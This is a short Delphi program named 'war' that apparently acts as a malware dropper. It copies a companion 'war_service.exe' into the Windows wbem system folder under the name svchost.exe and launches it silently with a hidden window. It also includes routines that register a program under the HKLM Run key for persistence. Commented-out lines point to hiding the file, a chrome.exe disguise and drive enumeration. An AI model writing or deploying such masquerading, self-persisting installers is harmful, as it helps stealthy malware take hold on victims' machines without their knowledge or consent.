program war;

//{$APPTYPE CONSOLE}

uses
  Messages, Windows, SysUtils, shellapi, registry, forms, Dialogs;

const
  path = 'C:\Windows\System32\wbem\';
  exename = 'svchost.exe';
//  exenameflash = 'chrome.exe';
//  regname = 'svchost';
//  drivers = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ';

var
  work: boolean = true;
  f: textfile;
  dow: integer;
  last_now: extended;
  rnd: integer;
  drvsiz: array[1..26] of int64;
  i: integer;
  programpath: string;

procedure DoAppToRun(RunName, AppName: string);
var
  Reg: TRegistry;
begin
  Reg := TRegistry.Create;
  with Reg do
  begin
    RootKey := HKEY_LOCAL_MACHINE;
    OpenKey('Software\Microsoft\Windows\CurrentVersion\Run', True);
    WriteString(RunName, AppName);
    CloseKey;
    Free;
  end;
end;

function IsAppInRun(RunName: string): Boolean;
var
  Reg: TRegistry;
begin
  Reg := TRegistry.Create;
  with Reg do
  begin
    RootKey := HKEY_LOCAL_MACHINE;
    OpenKey('Software\Microsoft\Windows\CurrentVersion\Run', False);
    Result := ValueExists(RunName);
    CloseKey;
    Free;
  end;
end;

function CopyToPath: Boolean;
var
  temp: string;
begin
  try
    if not DirectoryExists(path) then
      mkdir(path);

    if not fileexists(path+exename) then
      copyfile(pchar(extractfilepath(programpath)+'war_service.exe'), path+exename, true);
//    FileSetAttr(path+exename, faHidden);
    shellexecute(0, 'open', path+exename, '/install /silent', path, 0);
    result := false;
  except

  end;
end;

begin
  last_now := now;
  randomize;
  rnd := random(60);
  programpath := application.ExeName;
  CopyToPath;
end.
